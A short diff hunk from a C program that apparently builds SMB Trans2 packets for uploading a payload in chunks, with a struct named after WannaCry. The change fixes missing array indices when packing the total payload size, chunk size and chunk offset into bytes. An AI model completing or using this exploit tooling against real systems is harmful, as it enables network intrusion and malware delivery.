@@ -226,20 +226,20 @@ int main(int argc, char* argv[])
 	unsigned char ChunkSizeCHAR[4];
 	unsigned char OffsetofChunkinPayloadCHAR[4];
 
-	TotalSizeOfPayloadCHAR = TotalSizeOfPayload & 0xFF;
-	TotalSizeOfPayloadCHAR = (TotalSizeOfPayload >> 8) & 0xFF;
-	TotalSizeOfPayloadCHAR = (TotalSizeOfPayload >> 8 >> 8) & 0xFF;
-	TotalSizeOfPayloadCHAR = (TotalSizeOfPayload >> 8 >> 8 >> 8) & 0xFF;
+	TotalSizeOfPayloadCHAR[0] = TotalSizeOfPayload & 0xFF;
+	TotalSizeOfPayloadCHAR[1] = (TotalSizeOfPayload >> 8) & 0xFF;
+	TotalSizeOfPayloadCHAR[2] = (TotalSizeOfPayload >> 8 >> 8) & 0xFF;
+	TotalSizeOfPayloadCHAR[3] = (TotalSizeOfPayload >> 8 >> 8 >> 8) & 0xFF;
 
-	ChunkSizeCHAR = ChunkSize & 0xFF;
-	ChunkSizeCHAR = (ChunkSize >> 8) & 0xFF;
-	ChunkSizeCHAR = (ChunkSize >> 8 >> 8) & 0xFF;
-	ChunkSizeCHAR = (ChunkSize >> 8 >> 8 >> 8) & 0xFF;
+	ChunkSizeCHAR[0] = ChunkSize & 0xFF;
+	ChunkSizeCHAR[1] = (ChunkSize >> 8) & 0xFF;
+	ChunkSizeCHAR[2] = (ChunkSize >> 8 >> 8) & 0xFF;
+	ChunkSizeCHAR[3] = (ChunkSize >> 8 >> 8 >> 8) & 0xFF;
 
-	OffsetofChunkinPayloadCHAR = OffsetofChunkinPayload & 0xFF;
-	OffsetofChunkinPayloadCHAR = (OffsetofChunkinPayload >> 8) & 0xFF;
-	OffsetofChunkinPayloadCHAR = (OffsetofChunkinPayload >> 8 >> 8) & 0xFF;
-	OffsetofChunkinPayloadCHAR = (OffsetofChunkinPayload >> 8 >> 8 >> 8) & 0xFF;
+	OffsetofChunkinPayloadCHAR[0] = OffsetofChunkinPayload & 0xFF;
+	OffsetofChunkinPayloadCHAR[1] = (OffsetofChunkinPayload >> 8) & 0xFF;
+	OffsetofChunkinPayloadCHAR[2] = (OffsetofChunkinPayload >> 8 >> 8) & 0xFF;
+	OffsetofChunkinPayloadCHAR[3] = (OffsetofChunkinPayload >> 8 >> 8 >> 8) & 0xFF;
 
 	memcpy(big_packet + sizeof(wannacry_Trans2_Request), TotalSizeOfPayloadCHAR,4);
 	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 4, ChunkSizeCHAR,4);
